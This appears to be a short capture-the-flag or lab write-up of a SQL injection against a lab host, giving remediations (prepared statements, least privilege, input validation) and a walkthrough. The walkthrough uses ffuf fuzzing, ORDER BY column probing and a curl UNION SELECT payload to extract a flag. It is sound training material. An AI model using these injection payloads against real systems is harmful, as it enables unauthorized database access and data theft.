remediation: Prepared statements; a least-privilege DB user; input validation.
walkthrough: ffuf -u "http://target.lab.local/product?id=FUZZ" -w sqli-payloads.txt -mc all reveals column-count
  differences. curl "http://target.lab.local/product?id=1%20ORDER%20BY%203--%20-" succeeds, but ORDER
  BY 4 fails. curl "http://target.lab.local/product?id=-1%20UNION%20SELECT%201,2,flag%20FROM%20flags--%20-"
  extracts the flag.
